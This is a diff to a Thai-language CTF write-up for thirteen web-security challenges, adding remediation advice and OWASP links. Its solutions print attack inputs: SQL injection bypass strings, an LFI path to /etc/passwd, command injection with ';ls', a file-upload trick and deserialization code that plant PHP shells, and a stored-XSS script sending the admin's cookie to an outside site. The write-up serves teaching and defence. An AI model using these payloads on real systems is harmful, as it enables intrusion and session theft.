@@ -3,6 +3,10 @@ hint
     - ลองใช้ developer tools(f12) แล้วมองหาฟังก์ชันในไฟล์ JavaScript
 solution
     - เมื่อใช้ developer tools จะเห็นว่าเมื่อกดปุ่ม login จะไปเรียกฟังก์ชัน authenticate ในไฟล์ /login.js จะเห็นว่ามีการเช็ค username, password ที่ฝังอยู่ใน JavaScript เมื่อนำไปใช้ จะได้ flag ออกมา
+recommendation
+    - การทำการ authentication ด้วย JavaScript เป็นการทำฝั่ง Client-side ซึ่ง code ทุกอย่างจะสามารถดูได้จากฝั่ง user ทำให้ใครที่เข้าถึงหน้านั้น ๆ ได้ก็จะสามารถ Bypass authentication นั้น ๆ ได้ วิธีแก้ไขคือการทำการ authentication ที่ฝั่ง server จะต่อกับฐานข้อมูลหรือไม่ก็ได้ ซึ่ง code ที่เขียนและรัน จะอยู่ฝั่ง server เท่านั้น user ทั่วไปจะไม่สามารถเข้าถึง code การทำงานในส่วนนั้นได้
+link
+    - https://www.w3schools.com/js/js_whereto.asp
 
 
 #ch2 - 15pt
@@ -10,6 +14,10 @@ hint
     - ลองดูที่ URL ที่ลิงค์ไปดีๆสิ
 solution
     - จะสังเกตได้ว่าเมื่อกดที่ปุ่ม facebook, twitter, youtube จะถูกพาไปยัง /redirect.php?url=... โดยหากเราเปลี่ยน parameter url จะทำให้ redirect ไปที่ URL ที่เราต้องการได้ จากโจทย์ให้ redirect ไปที่ "https://www.evil.c0m" เมื่อใส่ใน parameter url ก็จะพบกับ flag
+recommendation
+    - ไม่นำ user input มาทำการ redirect แต่หากมีความจำเป็นต้องทำ ก็ให้ทำการ whitelist เฉพาะ URL ที่อนุญาตเท่านั้น ไม่ให้ทำการรับ user input แล้วนำมาทำการ redirect ตรง ๆ เพราะจะเกิดเป็นช่องโหว่ Open redirect ได้
+link
+    - https://www.owasp.org/index.php/Unvalidated_Redirects_and_Forwards_Cheat_Sheet
 
 
 #ch3 - 30pt
@@ -17,41 +25,65 @@ hint
     - ลองใช้ โปรแกรม Burp Suite Community Edition เพื่อดัก HTTP request ที่ถูกส่งออกไปดูสิ (ref Burp tutorial)
 solution
     - เมื่อดัก HTTP request ด้วย Burp จะเห็นว่ามี parameter score ถูกส่งออกไปใน body ของ request เมื่อทำการแก้ค่า parameter score ให้มากกว่า 100 แล้ว ส่งออกไป จะทำให้ได้ flag ของข้อนี้
-
+recommendation
+    - สำหรับโจทย์ ข้อนี้ จะเป็นช่องโหว่ด้านการ Design, การใช้ HTTP Post reqeust นั้นถึงแม้ว่า parameter จะไม่แสดงใน URL แต่ก็ยังสามารถถูกแก้ไขได้แม้ว่าจะ hidden input ก็ตาม ดังนั้นหากมีการคำนวณ หรือ logic ต่าง ๆ ให้ทำที่ฝั่ง server เช่นในข้อนี้ มีการใช้ Math.random() ซึ่งเป็นการสุ่มคะแนนส่งไปจากฝั่ง client วิธีแก้ คือให้ทำการสุ่่มคะแนนทางฝั่ง server จะทำให้ไม่สามารถแก้ไขโกงค่าคะแนนได้
+link
+    - https://en.wikipedia.org/wiki/POST_(HTTP)
+    - https://www.w3schools.com/tags/ref_httpmethods.asp
 
 #ch4 - 15pt
 hint
     - ลองสังเกตที่ URL parameter ดูอีกทีสิ
 solution
     - จากการสังเกตที่ URL เราจะพบว่ามี parameter id อยู่ซึ่งเป็นตัวเลข ลองคิดดูว่าถ้าเราเปลี่ยนเป็นเลขอื่นจะเกิดอะไรขึ้น !? เราก็จะเห็น User infomation ของ user อื่นได้ คราวนี้ลองไล่ดูไปเรื่อย ๆ ก็จะพบข้อมูลของ admin ที่ id = 1 แล้วจะพบ flag ใน email ของ admin
+recommendation
+    - IDOR เกิดจากการที่กำหนด ID ของ Object ด้วยการไล่เลขเพิ่มขึ้นไปเรื่อย ๆ ซึ่งทำให้คาดเดาได้ง่าย วิธีแก้ไข คือ การกำหนดสิทธิ์ ในการเข้าถึงให้เฉพาะ เจ้าของเท่านั้นที่สามารถดูข้อมูลของตนเองได้ และ ใช้ ID ที่คาดเดาได้ยาก เช่น UUID เป็นต้น
+link
+    - https://www.owasp.org/index.php/Testing_for_Insecure_Direct_Object_References_(OTG-AUTHZ-004)
 
 
 #ch5 - 50pt
 hint
     - มีอะไรอยู่ใน Cookie หรือเปล่าน้า
 solution
-    - หน้าเว็บของด่านนี้จะแทบไม่มีอะไรเลย แต่เมื่อสังเกตดีๆ จะเห็นว่ามี Cookie ชื่อว่า user อยู่ มีค่าเป็น UmFscGg6Z3Vlc3Q= ซึ่งหากดูจาก format แล้วน่าจะเป็น Base64 encoding เมื่อ decode ออกมาจะได้ Ralph:guest จากข้อความหน้าเว็บก็จะเดาได้ว่าต้องเป็น role admin ถึงจะเข้าถึงหน้านี้ได้ โดยให้เปลี่ยนจาก guest > admin ดังนี้ Ralph:guest > Ralph:admin แล้วนำไป Base64 encoding และ set Cookie user เมื่อเข้าหน้าเว็บด้วย Cookie ใหม่ก็จะพบกับ flag 
-
+    - หน้าเว็บของด่านนี้จะแทบไม่มีอะไรเลย แต่เมื่อสังเกตดีๆ จะเห็นว่ามี Cookie ชื่อว่า user อยู่ มีค่าเป็น UmFscGg6Z3Vlc3Q= ซึ่งหากดูจาก format แล้วน่าจะเป็น Base64 encoding เมื่อ decode ออกมาจะได้ Ralph:guest จากข้อความหน้าเว็บก็จะเดาได้ว่าต้องเป็น role admin ถึงจะเข้าถึงหน้านี้ได้ โดยให้เปลี่ยนจาก guest > admin ดังนี้ Ralph:guest > Ralph:admin แล้วนำไป Base64 encoding และ set Cookie user เมื่อเข้าหน้าเว็บด้วย Cookie ใหม่ก็จะพบกับ flag
+recommendation
+    - สาเหตุของช่องโหว่ในข้อนี้เกิดจากการที่ web server เชื่อ cookie มากเกินไป ทำให้ role ถูกแก้ไขมาจากการ set-cookie ฝั่ง client ได้ โดยทั่วไปแล้ว วิธีแก้ก็คือ web server จะทำการ set-cookie เพียง session ID ที่ผูกไว้กับ user นั้น ๆ และจะ ดึงข้อมูลต่าง ๆ ของ user คนนั้น รวมถึง role ออกมาได้
+link
+    - https://www.w3schools.com/php/php_cookies.asp
+    - https://www.owasp.org/index.php/Session_Management_Cheat_Sheet
+    - https://en.wikipedia.org/wiki/Base64
 
 #ch6 - 30pt
 hint
-    - Directory Indexing คืออะไร?, รูปถูกเก็บอยู่ที่ไหน ?
+    - Directory Listing คืออะไร?, รูปถูกเก็บอยู่ที่ไหน ?
 solution
-    - หน้าเว็บจะมีรูปมากมายแสดงอยู่ เมื่อเราดูที่ path ของรูปจะเห็นว่าอยู่ใน /images และ เมื่อทำความเข้าใจกับ Directory Indexing ก็จะพบว่าสามารถเข้าหน้า /images ได้และจะพบไฟล์ทั้งหมดที่อยู่ด้านใน จะเห็นว่ามีไฟล์ fl4g.txt ที่เก็บค่า flag ของข้อนี้อยู่
-
+    - หน้าเว็บจะมีรูปมากมายแสดงอยู่ เมื่อเราดูที่ path ของรูปจะเห็นว่าอยู่ใน /images และ เมื่อทำความเข้าใจกับ Directory Listing ก็จะพบว่าสามารถเข้าหน้า /images ได้และจะพบไฟล์ทั้งหมดที่อยู่ด้านใน จะเห็นว่ามีไฟล์ fl4g.txt ที่เก็บค่า flag ของข้อนี้อยู่
+recommendation
+    - ช่องโหว่นี้อยู่ในหมวด Security Misconfiguration ซึ่ง Directory Listing มักจะเปิดไว้ทำให้สามารถ ดูข้อมูลต่าง ๆ ภายใน Folder ที่อยู่บน web server ได้ วิธีแก้ไข จะต้องทำการ ปิด Listing ตามวิธีการที่แตกต่างไปในแต่ละ web server engine
+link
+    - https://www.acunetix.com/blog/web-security-zone/directory-listing-information-disclosure/
 
 #ch7 - 50pt
 hint
     - substitution cipher
 solution
     - จากโจทย์ จะให้ c3ludHszYVBlbGNnXzFmXzRfem5UdnB9 มาเมื่อนำไป Base64 decode จะได้ synt{3aPelcg_1f_4_znTvp} ซึ่งลักษณะคล้าย flag แต่ถูก encrypt ด้วย simple substitution ciphers ที่เรียกว่า Rot13 เป็นการ shift ตัวอักษรภาษาไป 13 ตัว เมื่อทำการ Base64 decode และ Rot13 ตามลำดับก็จะได้ flag ที่ซ่อนอยู่ออกมา
-
+recommendation
+    - การเข้ารหัส (Encryption) ที่แข็งแรงจะต้องใช้ Algorithm ที่เป็นที่ยอมรับ เช่น AES, RSA เป็นต้น ทั้งยังจำเป็นที่จะต้องใช้ key ที่มีความยาวที่ไม่น้อยเกินไปอีกด้วย แต่การเข้ารหัสในข้อนี้ เป็นการใช้ ROT13 ซึ่งไม่จำเป็นจะต้องมี key ซึ่งสามารถ crack ออกมาได้ง่าย
+link
+    - https://en.wikipedia.org/wiki/Caesar_cipher
+    - https://en.wikipedia.org/wiki/Base64
 
 #ch8 - 75pt
 hint
     - บน URL parameter นั่นอะไรอะ ชื่อไฟล์หรอ?
 solution
     - ด่านนี้หากสังเกตที่ URL เมื่อเรากดเปลี่ยนหน้า จะเปลี่ยนแค่ URL parameter ที่ชื่อว่า page เท่านั้น ซึ่งลักษณะเหมือนการ include file เข้ามา ดังนั้นจึงต้องลองทดสอบ Local file inclusion ด้วยการเซ็ตค่า page=../../../../../../../../../etc/passwd และ เมื่อสามารถทำ Local file inclusion ได้แล้วก็ไปอ่านไฟล์ ตามที่โจทย์บอกก็จะได้ flag
+recommendation
+    - ข้อนี้มีการใช้ PHP include() ที่รับ input มาจาก URL parameter โดยไม่ทำการ validate ข้อนี้ วิธีแก้คือไม่ควรที่จะให้มี user input เข้ามาที่ฟังก์ชัน include() หรือหากมีให้ ทำการ whitelist เฉพาะรายการที่อนุญาตเท่านั้น
+link
+    - https://www.owasp.org/index.php/Testing_for_Local_File_Inclusion
 
 
 #ch9 - 100pt
@@ -59,18 +91,38 @@ hint
     - try qoute'
 solution
     - หน้านี้เป็นหน้า login ที่มีการเชื่อมต่อกับฐานข้อมูล จึงทำการทดสอบด้วยการใส่ single qoute ' ไปใน input จะพบว่ามี error mysql เกิดขึ้น เมื่อทำการศึกษาต่อไป จะพบว่าเราสามารถ bypass authentication ได้ด้วยการใส่ ' or '1' = '1 หรือ ' or 1=1 -- - และเมื่อล็อคอินผ่านก็จะพบกับ flag ของข้อนี้
+recommendation
+    - ช่องโหว่ร้ายแรง SQL Injection เกิดขึ้นเพราะขาดการทำ input validation วิธีแก้มีหลากหลายแบบตาม OWASP ยกตัวอย่างเช่นการใช้ Use of Prepared Statements (with Parameterized Queries) โดยภาษา PHP ก็จะใช้ PDO with strongly typed parameterized queries โดยการใช้ bind_param() ดังตัวอย่างต่อไปนี้
 
+        // prepare and bind
+        $stmt = $conn->prepare("INSERT INTO MyGuests (firstname, lastname, email) VALUES (?, ?, ?)");
+        $stmt->bind_param("sss", $firstname, $lastname, $email);
+        $stmt->execute();
+
+    เพื่อป้องกันการเกิด SQL injection
+    ref:
+    - https://www.owasp.org/index.php/SQL_Injection_Prevention_Cheat_Sheet
+    - https://www.w3schools.com/php/php_mysql_prepared_statements.asp
+
+link
+    - https://www.owasp.org/index.php/SQL_Injection
+    - https://www.owasp.org/index.php/Top_10_2013-A1-Injection
 
 #ch10 - 200pt
 hint
     - ทำให้ admin ส่ง Cookie ของเขามาเว็บเราผ่านทาง URL โดยใช้ JS ดูสิ !
 solution
     - เป้าหมายของข้อนี้คือการขโมย Cookie ของ admin ให้ได้ ซึ่งหน้าเว็บมีฟังก์ชันสามารถโพสข้อความได้ ซึี่งสามารถโพสอะไรก็ได้ใน format HTML ไม่ว่าจะเป็น image, paragraph, header หรือแม้กระทั่ง script (JS) !! ทำให้มีช่องโหว่ Stored XSS โดยการที่จะขโมย Cookie ของ admin ได้นั้นทำได้หลากหลายท่า เราจะเฉลยหนึ่งในนั้น คือการให้ admin redirect ไปที่เว็บที่เราต้องการพร้อมกับ Cookie ของเขา Payload ดังนี้
-    <script>
-        window.location = "http://www.mysite.com/" + document.cookie;
-    </script>
-รอสักครู่แล้วไปดู log flag ซึ่งอยู่ใน Cookie ก็จะติดมากับ request นั้นๆ เป็นอันจบ เย่
-
+        <script>
+            window.location = "http://www.mysite.com/" + document.cookie;
+        </script>
+    รอสักครู่แล้วไปดู log flag ซึ่งอยู่ใน Cookie ก็จะติดมากับ request นั้นๆ เป็นอันจบ เย่
+recommendation
+    - วิธีแก้ XSS ก็คือ ทำการ Escape special character ทุก ๆ ครั้งที่มีการแสดง หรือสามารถ Escape character ตั้งแต่กระบวนการ insert ข้อมูลลงใน database ก็ทำได้เช่นเดียวกัน 
+    ref : https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet 
+link
+    - https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)
+    - https://www.owasp.org/index.php/Testing_for_Stored_Cross_site_scripting_(OTG-INPVAL-002)
 
 #ch11 150pt
 hint
@@ -83,7 +135,10 @@ solution
 
     แต่ก็ยังติดที่นามสกุลไฟล์ไม่ใช่ไฟล์รูป กลับไปดูโจทย์ดี ๆ อีกรอบ เมื่อเราสังเกตดู หน้าเว็บบอกว่าชื่อไฟล์จำกัดแค่ 40 ตัว ถ้าอัพมากกว่านั้นจะทำให้ชื่อไฟล์ที่เกินถูกตัดออก!! มาถึงตรงนี้บางคนอาจจะคิดออกแล้ว นั่นคือ อัพไฟล์ ที่มีชื่อ เกิน 40 ตัวและให้ตัดนามสกุลที่เป็น ของรูปออก แล้วก็เหลือไว้แค่ .php เช่น "123456789012345678901234567890123456.php.png" เป็นต้น
     หลังจากนั้นก็เข้าไป รัน os command เพื่อดูว่า flag อยู่ไหน จะพบว่าอยู่ที่ path ../flag_ch11.txt แล้ว cat ../flag_ch11.txt file อ่านมันออกมา จบ ง่าย ๆ ใช่ไหม ^^
-
+recommendation
+    - การทำ feature Upload file ให้ปลอดภัยจำเป็นที่จะต้องตรวจสอบสิ่งที่ผู้ใช้อัพมาให้ดี ต้องทำการตรวจสอบชนิดของไฟล์ หากเป็นไฟล์รูปให้ใช้ ฟังก์ชัน เพื่อตรวจสอบว่าเป็นรุปจริงไหม เช่น getimagesize() ใน PHP และต้องทำการ ตรวจสอบนามสกุลไฟล์ ตรวจสอบขนาดไฟล์ และ ควรที่จะเปลี่ยนชื่อ หลังจากการ อัพโหลดแล้วด้วย และ อาจเพิ่ม security header เช่น "Content-Disposition: Attachment" และ "X-Content-Type-Options: nosniff" ให้ response จาก server เป็น static file เป็นต้น
+link
+    - https://www.owasp.org/index.php/Unrestricted_File_Upload
 
 #ch12 150pt
 hint
@@ -92,8 +147,12 @@ solution
     - หน้านี้จะมีการนำชื่อ URL ไปรันคำสั่ง curl ซึ่งหากนำไปต่อ string แล้วรัน command ก็จะเกิดช่องโหว่ขึ้น โดยสามารถใส่ ;, &, &&, | เป็นต้น แล้วตามด้วย os command ต่าง ๆ (ในที่นี้คือ Linux command) เช่น
     "https://www.facebook.com/;ls" ก็จะรัน command "ls" หรือ จะตัดให้เหลือแค่
     ";ls" ก็จะรัน command "ls" เหมือนกัน
-    คราวนี้ จะพบว่ามี folder flag อยู่เข้าไปก็จะต้อง ls -a ถึงจะเจอไฟล์ .flag.txt 
+    คราวนี้ จะพบว่ามี folder flag อยู่เข้าไปก็จะต้อง ls -a ถึงจะเจอไฟล์ .flag.txt
     ให้ cat flag/.flag.txt ออกมาก็จะพบกับ flag ของข้อนี้
+recommendation
+    - การใช้ คำสั่ง system() หรือ คำสั่งใด ๆ ที่สมารถรัน OS command สิ่งที่ต้องห้ามก็คือ การนำ user input มาเป็น argument ใน ฟังก์ชั่นโดยไม่ทำการ validate input เพราะว่าจะทำให้เกิดช่องโหว่ OS command injection ได้ วิธีแก้ไข คือ หลีกเลี่ยงการใช้ฟังก์ชันที่รัน OS command โดยตรง หรือถ้าเลี่ยงไม่ได้ ให้ทำการ Escape input หรือ ทำ input validation เพื่อที่จะป้องกัน การใส่คำสั่งแปลกปลอมเข้ามา
+link
+    - https://www.owasp.org/index.php/Command_Injection
 
 #ch13 175pt
 hint
@@ -103,7 +162,7 @@ solution
         "O:4:"Item":4:{s:2:"id";s:4:"I003";s:4:"name";s:12:"Lunatic Card";s:11:"description";s:45:"LUK + 1, Critical Rate + 1, Perfect Dodge + 1";s:5:"price";i:10;}"
     ซึ่งเป็น string ของ php serialization โจทย์ข้อนี้จะทำการ Base64 decode และ unserialize และเขียน ข้อมูลของ object นั้นๆ ลงเป็นไฟล์ เมื่อรู้แบบนี้แล้วเราจะสามารถทำการ เขียน php shell ลงไปได้ โดยเริ่มจาก เขียนคลาส Item แล้วก็ attribute ข้างในตามโครงสร้าง จากนั้นก็ new object ,serialize(object) และ แสดง Base64 encode ของมันออกมา ดังโค้ดต่อไปนี้
 
-        <?php 
+        <?php
         // solution
 
         class Item {
@@ -119,3 +178,9 @@ solution
         ?>
 
     และจะได้ Redeem Code ออกมา เมื่อเอาไป redeem จะได้ไฟล์ php shell และ สามารถรัน os command ได้ ทำให้อ่าน ค่า flag ออกมาได้
+
+recommendation
+    - การป้องกัน Insecure Deserialization คือการหลีกเลี่ยงการใช้ให้มากที่สุด หรือใช้ Library ที่มีการ Secure Deserialization ให้ หากจำเป็นต้องให้ ต้องมีการทำ Input validation หรือ การกำหนดให้ สามาร deserialization ได้เฉพาะ sign data เท่านั้น
+link 
+    - https://www.owasp.org/index.php/Top_10-2017_A8-Insecure_Deserialization
+    - https://www.notsosecure.com/remote-code-execution-via-php-unserialize/
